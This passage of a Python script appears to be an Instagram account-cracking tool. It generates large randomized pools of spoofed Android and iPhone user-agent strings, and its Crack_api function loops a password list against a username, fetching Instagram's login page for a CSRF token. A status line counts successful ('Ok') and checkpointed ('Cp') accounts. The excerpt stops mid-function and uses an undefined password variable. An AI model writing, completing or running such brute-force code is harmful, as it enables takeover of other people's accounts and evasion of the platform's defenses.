39490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397327','267925708','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182276','271182266','271182277','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
    brand = random.choice(['samsung','realme','OnePlus','LAVA','TCL','motorola','Xiaomi','Redmi','POCO','Amazon','Google','OPPO','vivo','iQOO','HONOR','HUAWEI','ASUS','Nokia','Sony','Lenovo','ZTE','nubia','TECNO','Infinix','itel','Nothing','Meizu','Sharp','HTC','LG','Fairphone','BLU','Alcatel','Wiko','Coolpad','Micromax','Karbonn','Oukitel','UMIDIGI','Doogee','Ulefone','Blackview','ROG'])
    ig_version = random.choice(("70.0.0.15.98, 80.0.0.20.101,60.0.0.10.76, 85.0.0.25.100,75.0.0.22.99,72.0.0.18.94, 68.0.0.16.84,78.0.0.14.97, 63.0.0.20.81,81.0.0.24.105,73.0.0.16.96,67.0.0.18.88,84.0.0.21.110,74.0.0.18.100,71.0.0.15.92,79.0.0.14.103,62.0.0.18.80,87.0.0.22.115,76.0.0.20.102,83.0.0.18.10,66.0.0.16.87,88.0.0.24.118,77.0.0.22.103,64.0.0.18.82,82.0.0.20.107,69.0.0.14.92,89.0.0.20.123,61.0.0.14.76,86.0.0.18.112,65.0.0.12.86,42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121").split(","))
    model = random.choice(['SM-A015F','SM-A025F','SM-A035F','SM-A045F','SM-A055F','SM-A145F','SM-A155F','SM-A235F','SM-A245F','SM-A325M','SM-A336E','SM-A346E','SM-A525F','SM-A526B','SM-A536E','SM-A546E','SM-A556E','SM-G991B','SM-G996B','SM-G998B','SM-G990B','SM-S901B','SM-S906B','SM-S908B','SM-S911B','SM-S916B','SM-S918B','SM-S921B','SM-S926B','SM-S928B','SM-S931B','SM-S936B','SM-S938B','SM-N910F','SM-N975F','SM-F711B','SM-F721B','SM-F731B','SM-F741B','SM-F946B','SM-F956B','RMX2020','RMX2156','RMX2185','RMX3085','RMX3191','RMX3263','RMX3363','RMX3370','RMX3471','RMX3491','RMX3612','RMX3630','RMX3686','RMX3710','RMX3834','RMX3840','RMX3851','RMX3933','RMX3997','CPH1937','CPH2015','CPH2065','CPH2127','CPH2203','CPH2247','CPH2343','CPH2371','CPH2387','CPH2401','CPH2465','CPH2477','CPH2493','CPH2577','CPH2581','CPH2609','CPH2687','V2027','V2031','V2040','V2050','V2065','V2111','V2126','V2145','V2203','V2238','V2250','V2318','V2324','V2342','V2404','V2405','V2410','V2424','2312DRA50G','23127PN0CC','2312DRA50C','24040RN64Y','2406ERN9CI','M2007J3SG','M2102J20SG','M2101K7AG','M2102K1G','2201117TG','2201123G','22111317PG','22101320G','23049PCD8G','23122PCD1G','24069PC21G','24090RA29G','XQ-AT51','XQ-BE52','XQ-CT54','XQ-DQ72','XQ-ES72','A142','A144','AI2201_A','AI2302_A','AI2401_A','XT2019-1','XT2135-2','XT2215-1','XT2225-1','XT2341-1','XT2403-2','XT2431-3','Z60s','Z60 Ultra','5087Z','moto g(6) plus','moto g54 5G','moto g84 5G','Pixel 4a','Pixel 5','Pixel 5a','Pixel 6','Pixel 6 Pro','Pixel 6a','Pixel 7','Pixel 7 Pro','Pixel 7a','Pixel 8','Pixel 8 Pro','Pixel 8a','Pixel 9','Pixel 9 Pro','Pixel 9 Pro XL','Pixel 9a','OnePlus 7T','OnePlus 8','OnePlus 8T','OnePlus 9','OnePlus 9 Pro','OnePlus 10 Pro','OnePlus 11','OnePlus 12','OnePlus 12R','OnePlus 13','OnePlus Nord 2','OnePlus Nord 3','OnePlus Nord 4','LE2113','LE2123','NE2213','CPH2449','CPH2581','CPH2613','PEPM00','PDEM10','R7kf','R7f','R883T','KFRAWI','Seattle','Doha_TMO','moto g power','moto g stylus 5G'])
    iphone = random.choice(['iPad6,3', 'iPhone8,4', 'iPhone10,5', 'iPhone8,1', 'iPhone8,2', 'iPhone8,3','iPhone13,2', 'iPhone13,1', 'iPhone12,1', 'iPhone12,2', 'iPhone13,1', 'iPhone13,2','iPhone14,1', 'iPhone14,2', 'iPhone14,5', 'iPhone15,2', 'iPhone15,1', 'iPhone16,2','iPhone16,1', 'iPhone12,5', 'iPhone11,6', 'iPhone11,8', 'iPhone9,3', 'iPhone9,4','iPad7,1', 'iPad7,2', 'iPad7,3', 'iPad7,4', 'iPhone6,1', 'iPhone6,2', 'iPhone5,1','iPhone5,2', 'iPhone7,1', 'iPhone7,2', 'iPhone4,1', 'iPhone5,3', 'iPhone5,4','iPhone6,3', 'iPhone6,4', 'iPhone7,3', 'iPhone8,5', 'iPhone8,6', 'iPhone8,7','iPhone9,2', 'iPhone9,1', 'iPhone10,1', 'iPhone10,2', 'iPhone11,4', 'iPhone11,8','iPhone12,3', 'iPhone12,8', 'iPhone13,3', 'iPhone13,4', 'iPhone14,4', 'iPhone14,6','iPad8,1', 'iPad8,2', 'iPad8,3', 'iPad8,4', 'iPad9,1', 'iPad9,2', 'iPad9,3','iPad9,4', 'iPad10,1', 'iPad10,2', 'iPad10,3', 'iPad10,4', 'iPad11,1', 'iPad11,2','iPad12,1', 'iPad12,2', 'iPad13,1', 'iPad13,2', 'iPad13,4', 'iPad13,5', 'iPad14,1','iPad14,2', 'iPad14,3', 'iPad14,4', 'iPhone14,7', 'iPhone14,8', 'iPhone15,3', 'iPhone15,4','iPhone5,5', 'iPhone6,5', 'iPhone6,6', 'iPhone7,4', 'iPhone8,8', 'iPhone10,3', 'iPhone10,4','iPhone11,2', 'iPhone11,3', 'iPhone11,4', 'iPhone11,5', 'iPhone11,7', 'iPhone12,6', 'iPhone12,7','iPhone13,5', 'iPhone13,6', 'iPhone13,7', 'iPhone14,3', 'iPhone14,4', 'iPhone15,5', 'iPhone15,6','iPad9,5', 'iPad9,6', 'iPad9,7', 'iPad9,8', 'iPad10,5', 'iPad10,6', 'iPad11,3', 'iPad11,4','iPad12,3', 'iPad12,4', 'iPad13,3', 'iPad13,6', 'iPad14,5', 'iPad14,6', 'iPad15,1', 'iPad15,2','iPad16,1', 'iPad16,2', 'iPhone4,2', 'iPhone4,3', 'iPhone4,4', 'iPhone4,5', 'iPhone4,6', 'iPhone5,2', 'iPhone5,3','iPhone5,4', 'iPhone6,5', 'iPhone6,6', 'iPhone6,7', 'iPhone6,8', 'iPhone7,4', 'iPhone8,8','iPhone10,3', 'iPhone10,4', 'iPhone11,3', 'iPhone11,4', 'iPhone12,4', 'iPhone12,7', 'iPhone13,6','iPhone13,7', 'iPhone13,9', 'iPhone14,9', 'iPhone14,10', 'iPhone14,11', 'iPhone15,7','iPad10,7', 'iPad10,8', 'iPad11,5', 'iPad12,5', 'iPad13,8', 'iPad13,9', 'iPad14,8', 'iPad15,5','iPad16,3', 'iPad16,4', 'iPhone1,1', 'iPhone1,2', 'iPhone2,1', 'iPhone3,1', 'iPhone3,2', 'iPhone3,3', 'iPhone4,1','iPhone4,2', 'iPhone5,1', 'iPhone5,2', 'iPhone5,3', 'iPhone5,4', 'iPhone6,1', 'iPhone6,2','iPhone6,3', 'iPhone6,4', 'iPhone7,1', 'iPhone7,2', 'iPhone8,1', 'iPhone8,2', 'iPhone9,1','iPhone9,2', 'iPhone9,3', 'iPhone9,4', 'iPhone10,1', 'iPhone10,2', 'iPhone11,1', 'iPhone11,2','iPhone11,3', 'iPhone11,4', 'iPhone11,5', 'iPhone11,7', 'iPhone12,3', 'iPhone12,4', 'iPhone12,5', 'iPhone12,8','iPhone13,5', 'iPhone13,6', 'iPhone13,7', 'iPhone13,8', 'iPhone14,3', 'iPhone14,4', 'iPhone15,7'])
    build = random.choice(['a32','a52','a53','a54','a55','e1q','e2q','e3q','e5q','beyond1','beyond2','beyond2q','beyondx','RE54ABL1','RE54BFL1','RMX2020','RMX2156','RMX3363','RMX3834','RMX3840','OP5958L1','OP4ECB','OP4E7B','Z60s','Z60Ultra','Doha_TMO','evert_nt','evert','moonstone','R883T','raspite','cheetah','apollo','R7f','R7fC','trlte','raven','oriole','panther','lynx','shiba','husky','tokay','caiman','akita','felix','tangorpro','barbet','bluejay','redfin','bramble','sunfish','sargo','flame','bonito','sailfish','marlin','walleye','taimen','blueline','crosshatch','coral','laguna','aston','waffle','vermeer','alioth','psyche','diting','mondrian','gale','sky','gold','ruby','miami','hawaii'])
    chipset = random.choice(['mt6739','mt6761','mt6762','mt6765','mt6768','mt6769','mt6769t','mt6771','mt6785','mt6833','mt6853','mt6873','mt6877','mt6893','mt6895','mt6983','mt6985','qcom','msm8917','msm8953','sdm439','sdm450','sdm632','sdm636','sdm660','sdm665','sdm670','sdm710','sdm712','sdm730','sdm732','sdm765','sdm778g','sm6115','sm6225','sm6375','sm7150','sm7250','sm7325','sm7450','sm7550','sm7675','sm8250','sm8350','sm8450','sm8550','sm8650','exynos7420','exynos7884','exynos7885','exynos7904','exynos9611','exynos980','exynos1080','exynos1280','exynos1330','exynos1380','exynos1480','exynos1580','exynos2100','exynos2200','exynos2400','kirin659','kirin710','kirin810','kirin820','kirin9000','kirin9000s','sc9863a','sc9832e','t606','t610','t616','t618','t760','t820','gs101','gs201','gs301','gs401'])
    locale = random.choice(['id_ID','en_US','en_GB','en_AU','en_CA','en_IN','en_SG','ms_MY','th_TH','vi_VN','zh_CN','zh_TW','ja_JP','ko_KR','hi_IN','bn_BD','fil_PH','fr_FR','fr_CA','de_DE','es_ES','es_MX','it_IT','pt_BR','pt_PT','nl_NL','pl_PL','tr_TR','ru_RU','uk_UA','ar_SA','ar_AE','fa_IR','he_IL','sv_SE','da_DK','nb_NO','fi_FI','cs_CZ','hu_HU','ro_RO','el_GR'])
    ua1 = f'instagram {ig_version} Android ({android_version}; {dpi}; {pxl}; {brand}; {model}; {build}; {chipset}; {locale}; {kode})'
    ua2 = f'instagram {ig_version} ({iphone}; iOS 17_5_1; {locale}; ru; scale=3.00; {pxl}; {kode}; IABMV/1)'
    return(random.choice([ua1, ua2]))

def UA_OLD():
    D = {
        "Xiaomi/POCO": {"M2010J19CG": ("citrus","qcom","400","1080x2340"), "M2007J20CG": ("surya","qcom","440","1080x2400"), "21061119DG": ("vayu","qcom","440","1080x2400"), "2201116SG": ("peux","qcom","440","1080x2400"), "23122PCA4G": ("emerald","mtk","440","1080x2400"), "24031PN0DC": ("shennong","qcom","460","1200x2670"), "23113RKC6C": ("vermeer","qcom","480","1440x3200"), "2405CPX3DG": ("fuxi","qcom","522","1440x3200")},
        "Samsung": {"SM-S928B": ("eureka","qcom","500","1440x3120"), "SM-S918B": ("dm3q","qcom","600","1440x3088"), "SM-A546E": ("a54x","exynos","450","1080x2340"), "SM-A145F": ("a14m","mtk","400","1080x2408"), "SM-S21FE": ("r9q","qcom","480","1080x2400"), "SM-F731B": ("b5q","qcom","420","1080x2640"), "SM-A556B": ("a55x","exynos","450","1080x2340")},
        "Oppo": {"CPH2481": ("OP5567L1","qcom","480","1080x2400"), "CPH2357": ("OP5315L1","mtk","480","1080x2412"), "CPH2581": ("OP5A09L1","mtk","480","1080x2412"), "CPH2127": ("OP4F11L1","qcom","480","1080x2400"), "CPH2521": ("OP5865L1","mtk","480","1080x2412")},
        "Infinix": {"X6833B": ("infinix-hot30","mtk","400","1080x2460"), "X6711": ("infinix-note30","mtk","390","1080x2460"), "X6850": ("infinix-note40","mtk","400","1080x2436"), "X6525": ("infinix-smart8","unisoc","320","720x1612")},
        "Apple": {"iPhone17,2": ("17,2","apple","460","1290x2796"), "iPhone16,1": ("16,1","apple","460","1179x2556"), "iPhone15,3": ("15,3","apple","460","1290x2796"), "iPhone14,5": ("14,5","apple","460","1170x2532"), "iPhone13,2": ("13,2","apple","460","1170x2532")},
        "Google": {"Pixel 9 Pro XL": ("komodo","tensor","490","1344x2992"), "Pixel 8 Pro": ("husky","tensor","490","1344x2992"), "Pixel 7": ("panther","tensor","420","1080x2400"), "Pixel 6a": ("bluejay","tensor","420","1080x2400")}
    }
    B = random.choice(list(D.keys())); M = random.choice(list(D[B].keys())); C, CH, DP, RS = D[B][M]; RID = str(random.randint(100000000,999999999))
    if B == "Apple":
        IV = f"{random.randint(16,18)}_{random.randint(0,5)}_{random.randint(0,1)}"
        return f"Instagram 300.0.0.29.110 (iPhone; CPU iPhone OS {IV} like Mac OS X; en_US; {M}; 300.0.0.29.110; {RID})"
    AV = random.randint(11, 15); AL = {11:"30", 12:"31", 13:"33", 14:"34", 15:"35"}.get(AV)
    return f"Instagram 300.0.0.29.110 Android ({AL}/{AV}; {DP}dpi; {RS}; {B}; {M}; {C}; {CH}; in_ID; {RID})"

def Crack_api(username, kontol):
    global Ok, Cp, Loop
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} web {YELLOW}{Loop}{WHITE}-{GREEN}{str(len(Uuid))}{WHITE}-{GREEN}{str(username)[:6]}{WHITE}-Ok:-{GREEN}{Ok}{WHITE}-Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    for password in kontol:
        try:
            ses = requests.Session()
            session = requests.Session()
            response = session.get('https://www.instagram.com/accounts/login/')
            csrftoken = response.cookies.get('csrftoken')
            time_now = int(datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
